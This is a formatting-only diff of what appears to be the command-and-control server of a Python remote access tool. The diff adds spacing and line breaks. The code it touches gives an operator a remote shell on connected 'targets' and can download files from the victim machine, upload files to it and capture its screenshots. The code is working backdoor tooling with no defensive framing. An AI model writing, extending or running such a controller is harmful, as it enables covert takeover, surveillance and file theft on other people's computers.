@@ -2,10 +2,13 @@ import json
 import struct
 import base64
 import uuid
-def send_frame(target,data):
+
+
+def send_frame(target, data):
     prefix = struct.pack(">I", len(data))
     target.send(prefix)
     target.send(data)
+
 
 def receive_frame(target):
     prefix = b""
@@ -15,13 +18,14 @@ def receive_frame(target):
     frame = b""
     frame_len = struct.unpack(">I", prefix)[0]
     while len(frame) < frame_len:
-        frame += target.recv(min(1024,frame_len-len(frame)))
+        frame += target.recv(min(1024, frame_len-len(frame)))
     return json.loads(frame.decode("utf-8"))
 
 
-def reliable_send(target,data):
+def reliable_send(target, data):
     json_data = json.dumps(data).encode("utf-8")
-    send_frame(target,json_data)
+    send_frame(target, json_data)
+
 
 help_message = '''
 targets: List all connections to the server
@@ -36,7 +40,8 @@ help: Show this message
 
 '''
 
-def start_shell(target_socket,target_ip):
+
+def start_shell(target_socket, target_ip):
     while True:
         try:
             cmd = input(f"{target_ip}~$ ")
@@ -51,14 +56,15 @@ def start_shell(target_socket,target_ip):
                 if file_data == "DOWNLOAD_FAIL":
                     print("Download Failed")
                 else:
-                    with open(cmd[9:],"wb") as f:
+                    with open(cmd[9:], "wb") as f:
                         f.write(base64.b64decode(file_data))
             elif cmd[:6] == "upload":
                 try:
-                    with open(cmd[7:],"rb") as f:
+                    with open(cmd[7:], "rb") as f:
                         file_to_upload = f.read()
                         encoded_file = base64.b64encode(file_to_upload)
-                        reliable_send(target_socket, encoded_file.decode("utf-8"))
+                        reliable_send(
+                            target_socket, encoded_file.decode("utf-8"))
                 except Exception as e:
                     print(e)
                     failed = "UPLOAD_FAIL"
@@ -68,7 +74,7 @@ def start_shell(target_socket,target_ip):
                 if file_data == "SCREENSHOT_FAIL":
                     print("Screenshot Failed")
                 else:
-                    with open("screenshot_"+uuid.uuid4().hex+".png","wb") as f:
+                    with open("screenshot_"+uuid.uuid4().hex+".png", "wb") as f:
                         f.write(base64.b64decode(file_data))
         except Exception as e:
             print(str(e))
